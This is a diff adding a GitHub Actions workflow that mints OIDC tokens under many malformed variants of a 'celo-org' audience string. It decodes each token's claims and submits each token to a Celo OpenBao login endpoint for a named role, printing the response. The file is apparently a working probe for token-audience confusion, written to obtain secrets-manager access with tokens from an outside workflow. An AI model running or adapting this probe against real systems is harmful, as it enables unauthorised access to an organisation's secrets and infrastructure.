@@ -1,0 +1,29 @@
+name: aud-variants
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          set -u
+          for A in 'https://github.com/celo-org' 'https://github.com/celo-org ' ' https://github.com/celo-org' 'https://github.com/celo-org/' 'https://github.com/Celo-Org' 'https://github.com:443/celo-org' 'https://github.com./celo-org' 'https://github.com/celo-org%20' 'https://github.com/celo-org%2F' 'https://github.com/celo-org?x=1' 'https://github.com/celo-org#x' 'https://github.com/celo-org%00'; do
+            echo "=== [$A]"
+            E=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$A")
+            R=$(curl -s -w '\n%{http_code}' -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$E")
+            echo "http=$(echo "$R" | tail -1)"
+            B=$(echo "$R" | head -1)
+            V=$(echo "$B" | jq -r '.value // empty' 2>/dev/null)
+            if [ -n "$V" ]; then
+              echo "$V" | cut -d. -f2 | python3 -c 'import sys,base64,json; s=sys.stdin.read().strip(); s+="="*(-len(s)%4); d=json.loads(base64.urlsafe_b64decode(s)); print("AUD="+str(d.get("aud"))+" REPO="+str(d.get("repository")))' 2>/dev/null
+              echo "=== openbao"
+              curl -s -X POST 'https://openbao.akeyless.celo-networks-dev.org/v1/auth/github/login' -H 'Content-Type: application/json' -d "{\"role\":\"celo-org_tests-gh-workflows-actions\",\"jwt\":\"$V\"}" | head -c 400; echo
+            else
+              echo "$B" | head -c 250; echo
+            fi
+            echo
+          done
